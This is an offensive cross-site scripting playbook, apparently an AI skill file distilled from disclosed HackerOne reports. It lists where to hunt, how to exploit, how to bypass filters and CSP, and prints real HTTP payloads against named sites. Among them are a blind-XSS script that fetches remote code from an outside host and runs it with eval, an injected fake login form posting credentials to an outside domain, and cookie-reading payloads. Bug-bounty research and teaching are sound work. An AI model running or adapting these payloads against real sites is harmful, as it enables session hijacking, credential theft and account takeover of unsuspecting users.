---
name: xss
description: "Cross-Site Scripting (XSS) offensive playbook from 778 disclosed HackerOne reports (18 critical, 149 high, 429 medium, 182 low). Use when hunting or reviewing cross-site scripting (xss). Triggers: xss, stored, reflected, attacker, scripting."
license: "For authorized security testing and education only."
---

# Cross-Site Scripting (XSS)

> Distilled from **778** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Attacker-controlled input is reflected/stored/DOM-sunk into a page and executed as script in a victim's origin. Covers reflected, stored, DOM, and mutation XSS.

## Where to hunt

- Fuzz every sink that renders user input: search, profile fields, filenames, error messages, `innerHTML`/`document.write`, SVG/HTML uploads, markdown, `postMessage` handlers.
- Track sources → sinks in JS for DOM XSS (`location`, `hash`, `name`, `postMessage` → `innerHTML`, `eval`, `setAttribute`).
- Test content types: does a JSON/API endpoint reflect input with `text/html`?

## Exploitation playbook

- Confirm execution with a benign marker, then escalate to a session/cookie or CSRF-token exfil payload against a same-origin sensitive endpoint.
- Stored XSS in shared content (comments, names, tickets) to hit admins/support who view it.
- SVG/HTML file upload served inline (`Content-Disposition: inline`, `image/svg+xml`) executing embedded JS.

## Bypass techniques

- Break blocklists with event handlers (`onload`,`onbegin`,`onerror`), SVG/MathML, mutation via DOM re-parsing (mXSS), and encoding (HTML entities, unicode, double-encode).
- Escape attribute/JS contexts, use backticks/template literals, break out of quotes, or exploit incomplete tag stripping and length-limited scanners.
- CSP bypass via JSONP endpoints, `unsafe-eval`, dangling markup, or trusted-but-injectable script hosts.

## Impact & escalation

- Same-origin authenticated requests → account takeover; admin-panel stored XSS → workspace-wide compromise; self-propagating XSS worms via profile/signature fields.

## Remediation

- Context-aware output encoding, CSP with nonces, sanitize with a vetted library, force `Content-Disposition: attachment` for user files, avoid dangerous DOM sinks.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#2078490](https://hackerone.com/reports/2078490)  -  Stored xss at https://█.8x8.com/api/█/ID
*high, $1,337*

```http
POST /api/patchPaymentMethod/█████████ HTTP/2
Host: ███.8x8.com
Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fb…
Content-Type: application/json
Content-Length: 112

{
              "ipAddress": "<svg on onload=(alert)(document.domain)>",
"callBackURL":"dssdsd"
            }
```

### 2. [#314126](https://hackerone.com/reports/314126)  -  Blind XSS - Report review - Admin panel
*medium, $350*

```http
POST /v2/█████merchant HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 485
Host: api.zomato.com

reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

### 3. [#1069528](https://hackerone.com/reports/1069528)  -  Reflected XSS on gamesclub.mtn.com.g
*medium*

```http
GET /header.aspx HTTP/1.1
Host: gamesclub.mtn.com.gh
Cookie: _ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wrle55…
```

### 4. [#988272](https://hackerone.com/reports/988272)  -  stored XSS in hey.com message content
*medium*

```http
POST /messages HTTP/1.1
Host: app.hey.com
Referer: https://app.hey.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://app.hey.com
Content-Length: 1156

-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="acting_user_id"

{acting_user_id}
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="entry[addressed][directly][]"

[second-email]@hey.com
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[subject]"

Fwd: csdc
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[content]"

From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
# … truncated …
```

### 5. [#903869](https://hackerone.com/reports/903869)  -  [bugs.fuzzing-project.org] HTML Injection via 'custom_field_7[]' pa…
*medium*

```http
POST /view_all_set.php?f=3 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Referer: https://bugs.fuzzing-project.org/
Cookie: MANTIS_secure_session=0;MANTIS_collapse_settings=|sidebar:1|filter:1;PHPSESSID=1495fp23866b0m12bi541et8c7
Content-Length: 1947
Host: bugs.fuzzing-project.org

category_id[]=0&custom_field_1[]=0&custom_field_2[]=0&custom_field_3[]=0&custom_field_4[]=0&custom_field_5[]=0&custom_field_6[]=0&custom_field_7[]=0'"()%26%25"'</td>--><div class="position-relative"><div class="signup-box visible widget-box no-border" id="login-box"><div class="widget-body"><div class="widget-main"><h4 class="header lighter bigger"><i class="ace-icon fa fa-sign-in"></i>Inicio de sesión</h4><div class="space-10"></div><form id="login-form" method="post" action="https://www.dragonjar.org"><fieldset><label for="username" class="block clearfix"><span class="block input-icon input-icon-right"><input id="username" name="username" type="text" placeholder="Nombre de usuario"   size="32" maxlength="191" value=""   class="form-control autofocus"><i class="ace-icon fa fa-user"></i></span></label><label for="password" class="block clearfix"><span class="block input-icon input-icon-right"><input id="password" name="password" type="password" placeholder="Contraseña" size="32" maxlength="1024" class="form-control autofocus"><i class="ace-icon fa fa-lock"></i></span></label><div class="space-10"></div><input type="submit" class="width-40 pull-right btn btn-success btn-inverse bigger-110" value="Iniciar sesión" /></fieldset></form></div><!--&dir[]=ASC&end_day=15&end_month=2&end_year=2020&filter=Use%20Filter&filter_by_date=0&filter_by_last_updated_date=0&handler_id[]=0&hide_status[]=-2&highlight_changed=6&last_updated_end_day=15&last_updated_end_month=2&last_updated_end_year=2020&last_updated_start_day=15&last_updated_start_month=2&last_updated_start_year=2020&match_type=0&monitor_user_id[]=0&note_user_id[]=0&os[]=0&os_build[]=0&per_page=50&platform[]=0&priority[]=0&profile_id[]=0&relationship_bug=0&relationship_type=-1&reporter_id[]=0&resolution[]=0&search=the&severity[]=0&sort[]=priority&start_day=15&start_month=2&start_year=2020&status[]=10&sticky=0&tag_select=0&tag_string=17&type=1&view_state=0&view_type=simple
# … truncated …
```

### 6. [#425048](https://hackerone.com/reports/425048)  -  Stored XSS on chaturbate.com (wish list)
*low, $100*

```http
POST /accounts/editbio/ HTTP/1.1
Host: chaturbate.com
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://chaturbate.com/p/gwen129347565/?tab=bio
Content-Length: 738
Cookie: __cfduid=d2934f3470865ee3896a47085641d896a1538487853; affkey="eJyrViopylayUlBKzU1KTVHSUVBKTE…

csrfmiddlewaretoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt&next=%2Faccounts%2Fshowbio%2F&real_name=aaaa&birthday_month=2&birthday_day=3&birthday_year=1963&gender=f&interested_in=f&location=France&spoken_languages=English&body_type=&smoke_drink=&body_decorations=&about_me=&wish_list=bbbbbb<img src="http://poc.10degres.net/ooo.png" style="width:expression(open(alert(document.cookie)))">aaa
```

More payloads: see [payloads.md](payloads.md) (513 curated).

## Recurring patterns in this dataset

Most frequent terms across the 778 reports (term (count)): `xss` (885), `stored` (334), `reflected` (280), `attacker` (197), `scripting` (186), `malicious` (180), `code` (167), `cross-site` (160), `html` (149), `allowed` (138), `javascript` (132), `parameter` (126), `discovered` (124), `page` (119), `execute` (111), `found` (103), `arbitrary` (100), `injection` (96)

## Worked example  -  [report #1212067](https://hackerone.com/reports/1212067)

*Stored XSS in markdown via the DesignReferenceFilter* (critical, $16,000)

> Summary When rendering markdown, links to designs are parsed using the following link reference pattern: https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design management/design.rb L168 The url filename match is then used in parse symbol: https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design reference filter.rb L75 Since valid char is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched. The final url match gets used when creating the link in object link filter: https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract referen…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1212067](https://hackerone.com/reports/1212067) | critical | $16,000 | gitlab | Stored XSS in markdown via the DesignReferenceFilter |
| [#409850](https://hackerone.com/reports/409850) | critical | $7,500 | valve | XSS in steam react chat client |
| [#982291](https://hackerone.com/reports/982291) | critical | $5,000 | basecamp | HEY.com email stored XSS |
| [#1010466](https://hackerone.com/reports/1010466) | critical | $1,000 | cs_money | Blind XSS on image upload |
| [#503298](https://hackerone.com/reports/503298) | critical | $700 | x | Multiple XSS on account settings that can hijack any users in the company. |
| [#1532858](https://hackerone.com/reports/1532858) | critical | $200 | omise | Cross-site scripting on dashboard2.omise.co |
| [#487081](https://hackerone.com/reports/487081) | critical |  -  | wordpress | Stored XSS in Private Message component (BuddyPress) |
| [#2515808](https://hackerone.com/reports/2515808) | critical |  -  | toolsforhumanity | [Meetup][World ID][OIDC] Insufficient Filtering of "state" Parameter in Response Mode f… |

*See [reference.md](reference.md) for all 778 reports in this class.*
